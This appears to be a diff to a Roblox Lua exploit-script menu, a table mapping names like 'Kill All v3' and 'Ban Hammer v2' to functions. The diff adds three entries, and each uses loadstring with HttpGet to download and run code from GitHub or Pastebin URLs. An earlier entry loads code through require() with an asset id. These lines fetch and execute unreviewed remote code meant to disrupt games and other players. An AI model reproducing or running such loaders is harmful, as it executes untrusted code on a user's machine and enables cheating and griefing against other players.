@@ -73,6 +73,19 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/
     ["c00lguiTuber93"] = function()
 
 require(6032524768).Eagle('nytrfe_n0offcial')
+    end,
+
+    ["ERMH..."] = function()
+
+loadstring(game:HttpGet("http://raw.githubusercontent.com/Lukiblokck/My-Roblox-Scripts/refs/heads/main/HAHA.txt"))()
+    end,
+
+    ["Kill All v3?!?!?!!?!?"] = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/iz037/Zeld-Hub/main/Loader.lua"))()
+    end,
+
+    ["Ban Hammer v2?!?!?!?"] = function()
+loadstring(game:HttpGet("https://pastebin.com/raw/FRJ4wpVb"))("Copyright ERROR_CODE ECCS Co")
     end
 }
 
